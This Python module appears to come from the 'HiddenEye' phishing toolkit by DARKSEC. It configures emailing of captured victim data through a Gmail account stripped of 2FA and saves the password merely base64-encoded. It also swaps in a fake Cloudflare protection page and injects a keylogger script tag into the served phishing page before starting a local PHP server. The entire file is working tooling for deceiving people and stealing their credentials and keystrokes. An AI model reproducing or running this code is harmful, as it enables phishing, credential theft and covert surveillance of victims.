# Any actions must be here

import getpass
import base64
from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Defs.ThemesManager import colorSelector
from Defs.Configurations import readConfig, ifSettingsNotExists
from Defs.Languages import *




















def emailPrompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingEmail()


def addingEmail():
    print("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        print("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n".format(MAIN0, MAIN4))
        input('[.] Press Enter To Start Configuring Gmail Credential File...')
        emailPrompt2()
    elif choice == 'N':
        pass
    else:
        print('[^] ERROR: Please choose correct option to continue...')
        sleep(1)
        emailPrompt()


def emailPrompt2():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    emailConfig()


def emailConfig():
    system('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
    GMAILACCOUNT = input(
        "{0}[{1}+{0}]{0} Enter Your Gmail Username:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('GMAILACCOUNT', GMAILACCOUNT)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))

    GMAILPASSWORD = getpass.getpass(
        "{0}[{1}+{0}]{0} Enter Your Gmail Password:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
        GMAILPASSWORD = (GMAILPASSWORD.decode('utf-8'))
        c = read_data.replace('GMAILPASSWORD', GMAILPASSWORD)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
            MAIN0, MAIN4))
    RECIPIENTEMAIL = input(
        "{0}[{1}+{0}]{0} Enter Recipient Email:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('RECIPIENTEMAIL', RECIPIENTEMAIL)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))
        print(
            '\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)'.format(MAIN0, MAIN4))


def cloudflarePrompt():

    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingCloudfare()


def addingCloudfare():
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addCloudfare()
    else:
        sleep(1)


def addCloudfare():
    system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(MAIN0, MAIN4))
    sleep(1)


def keyloggerprompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))


def addingkeylogger():
    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addkeylogger()
    else:
        sleep(1)


def addkeylogger():
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)
    else:
        with open('Server/www/index.php') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.php', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)


def runServer(port):
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))




